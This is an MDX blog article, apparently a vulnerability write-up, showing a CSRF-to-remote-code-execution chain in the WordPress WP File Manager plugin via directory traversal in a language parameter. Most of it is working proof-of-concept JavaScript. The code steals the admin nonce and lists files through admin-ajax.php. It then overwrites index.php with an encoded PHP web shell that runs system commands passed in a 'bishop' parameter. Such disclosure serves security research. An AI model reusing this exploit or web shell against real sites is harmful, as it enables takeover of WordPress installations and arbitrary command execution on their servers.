import { ArticleLayout } from '@/components/ArticleLayout'

export const article = {
  author: 'Daniel',
  date: '2024-02',
  title: 'CSRF to RCE with WP File Manager',
  description:
    'CSRF to RCE',
}

export const metadata = {
  title: article.title,
  description: article.description,
}

export default (props) => <ArticleLayout article={article} {...props} />






Initially carrying out checks for LFI noticed the Language select field would try to get a
Javascript file depending on the language selected. A request was still made when the field was
empty, and directory traversal was possible with "../".
A ".js" is appended to the query, initially I tried splitting the URL with null bytes, converting the
lang parameter to another query, adding # for a split on the fragment, while it may be possible; I
moved on.


Given the "lang" parameter is requesting a JavaScript file and we can have the freedom to
control where the victim retrieves it from. We need to create a malicious JavaScript file; fairly
typical for CSRF vulnerabilities to exploit the privileges of the victim to promote an attackers
account, this attack doesn't specifically require the attack to be authenticated; so long as they
can get a JavaScript file on the host. The Proof of concept script allows Remote Code
Execution by getting the Administrator to edit a WordPress PHP file, appending basic Web Shell
capabilities.


## Proof of Concept

The genRid function is copied from WP File Manager, it is appended to the end of POST
requests.

```javascript

    function genRid(){
        return reqId = (+ new Date()).toString(16) + Math.floor(1000 * Math.random()).toString(16);
    }

```

The WordPress Nonce is read from the document object available when the script is first called.

```javascript

    var nonceget = document.querySelector("#file_manager_free_shortcode_admin-jsextra").text;
    nonce = nonceget.slice(89,99);

```

The initial XMLHttpRequest utilizes the WordPress nonce and retrieves a list of files from WP
File Manager.

```javascript

    var req1 = new XMLHttpRequest();
    req1.open('GET', `http://127.0.0.1:1337/wp-admin/admin-ajax.php?action=mk_file_folder_manager&_wpnonce=${nonce}&networkhref=&cmd=open&target=l1_Lw&init=1&tree=1&_=1707815126701`, false);
    req1.withCredentials = true;
    req1.send();
    var obj = JSON.parse(req1.response);
```

If the resulting Object returns with files; index.php is located. 

```javascript
    
    if (obj['files']){
        obj['files'].forEach(element => { if (element['mime'] == "text/x-php" && element['name'] == "index.php") { editFile(element); } }); 
    } 
```

Finally the file is edited with a XMLHttpRequest inserting malicious PHP along with the exsisting file content in the base WordPress index.php file.

```javascript

    function editFile(element){
        
        var payload = "%3C%3Fphp%0Adefine(+'WP_USE_THEMES'%2C+true+)%3B%0Arequire+__DIR__+.+'%2Fwp-blogheader.php'%3B%0A%0Aif+(isset(%24_REQUEST%5B%22bishop%22%5D))%7B%0A%09echo+system(%24_REQUEST%5B%22bishop%22%5D)%3B%0A%7D%3B";
        var params = `action=mk_file_folder_manager&_wpnonce=${nonce}&networkhref=&cmd=put&target=${element["hash"]}&encoding=UTF-8&content=${payload}&reqid=${genRid()}`;
        var freq = new XMLHttpRequest();
        freq.open('POST', 'http://127.0.0.1:1337/wp-admin/admin-ajax.php', false);
        freq.withCredentials = true;
        freq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        freq.send(params);
        var freqResponse = freq.response;
    }

```

If successful the system commands can be executed via appending a bishop parameter to the
index page.
